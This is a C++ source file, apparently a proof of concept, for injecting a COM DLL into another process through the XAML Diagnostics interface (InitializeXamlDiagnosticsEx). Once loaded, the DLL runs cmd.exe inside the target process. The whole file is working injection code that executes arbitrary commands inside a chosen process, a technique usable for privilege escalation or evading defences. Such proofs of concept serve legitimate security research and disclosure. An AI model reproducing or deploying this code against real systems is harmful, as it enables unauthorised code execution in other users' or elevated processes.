#include <windows.h>
#include <guiddef.h>
#include <Unknwn.h>
#include <winrt/base.h>
#include <xamlom.h>

#pragma region tap_hpp

#include <ocidl.h>

// {AB61735B-2C1C-49CA-83D0-4BDBEA724B9D}
static constexpr CLSID CLSID_ProofOfConceptTAP = { 0xab61735b, 0x2c1c, 0x49ca, { 0x83, 0xd0, 0x4b, 0xdb, 0xea, 0x72, 0x4b, 0x9d } };

struct ProofOfConceptTAP : winrt::implements<ProofOfConceptTAP, IObjectWithSite, winrt::non_agile>
{
	HRESULT STDMETHODCALLTYPE SetSite(IUnknown* pUnkSite) override;
	HRESULT STDMETHODCALLTYPE GetSite(REFIID riid, void** ppvSite) noexcept override;

private:
	template<typename T>
	static winrt::com_ptr<T> FromIUnknown(IUnknown* pSite)
	{
		winrt::com_ptr<IUnknown> site;
		site.copy_from(pSite);

		return site.as<T>();
	}

	winrt::com_ptr<IVisualTreeService3> visualTreeService;
};

#pragma endregion  // tap_hpp

#pragma region tap_cpp

HRESULT ProofOfConceptTAP::SetSite(IUnknown* pUnkSite) try
{
	visualTreeService = FromIUnknown<IVisualTreeService3>(pUnkSite);

	WinExec("cmd.exe", SW_SHOWDEFAULT);

	return S_OK;
}
catch (...)
{
	return winrt::to_hresult();
}

HRESULT ProofOfConceptTAP::GetSite(REFIID riid, void** ppvSite) noexcept
{
	return visualTreeService.as(riid, ppvSite);
}

#pragma endregion  // tap_cpp

#pragma region simplefactory_hpp

#include <Unknwn.h>

template<class T>
struct SimpleFactory : winrt::implements<SimpleFactory<T>, IClassFactory, winrt::non_agile>
{
	HRESULT STDMETHODCALLTYPE CreateInstance(IUnknown* pUnkOuter, REFIID riid, void** ppvObject) override try
	{
		if (!pUnkOuter)
		{
			*ppvObject = nullptr;
			return winrt::make<T>().as(riid, ppvObject);
		}
		else
		{
			return CLASS_E_NOAGGREGATION;
		}
	}
	catch (...)
	{
		return winrt::to_hresult();
	}

	HRESULT STDMETHODCALLTYPE LockServer(BOOL) noexcept override
	{
		return S_OK;
	}
};

#pragma endregion  // simplefactory_hpp

#pragma region module_cpp

#include <combaseapi.h>

_Use_decl_annotations_ STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) try
{
	if (rclsid == CLSID_ProofOfConceptTAP)
	{
		*ppv = nullptr;
		return winrt::make<SimpleFactory<ProofOfConceptTAP>>().as(riid, ppv);
	}
	else
	{
		return CLASS_E_CLASSNOTAVAILABLE;
	}
}
catch (...)
{
	return winrt::to_hresult();
}

_Use_decl_annotations_ STDAPI DllCanUnloadNow(void)
{
	if (winrt::get_module_lock())
	{
		return S_FALSE;
	}
	else
	{
		return S_OK;
	}
}

#pragma endregion  // module_cpp

using PFN_INITIALIZE_XAML_DIAGNOSTICS_EX = decltype(&InitializeXamlDiagnosticsEx);

HMODULE GetCurrentModuleHandle()
{
	HMODULE module;
	if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
		GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		L"", &module))
	{
		return nullptr;
	}

	return module;
}

HRESULT InjectTAP(DWORD pid, PCWSTR endpointName) noexcept
{
	HMODULE module = GetCurrentModuleHandle();
	if (!module)
	{
		return HRESULT_FROM_WIN32(GetLastError());
	}

	WCHAR location[MAX_PATH];
	switch (GetModuleFileName(module, location, ARRAYSIZE(location)))
	{
	case 0:
	case ARRAYSIZE(location):
		return HRESULT_FROM_WIN32(GetLastError());
	}

	const HMODULE wux(LoadLibraryEx(L"Windows.UI.Xaml.dll", nullptr, LOAD_LIBRARY_SEARCH_SYSTEM32));
	if (!wux) [[unlikely]]
	{
		return HRESULT_FROM_WIN32(GetLastError());
	}

	const auto ixde = reinterpret_cast<PFN_INITIALIZE_XAML_DIAGNOSTICS_EX>(GetProcAddress(wux, "InitializeXamlDiagnosticsEx"));
	if (!ixde) [[unlikely]]
	{
		return HRESULT_FROM_WIN32(GetLastError());
	}

	const HRESULT hr2 = ixde(endpointName, pid, L"", location, CLSID_ProofOfConceptTAP, nullptr);
	if (FAILED(hr2)) [[unlikely]]
	{
		return hr2;
	}

	return S_OK;
}
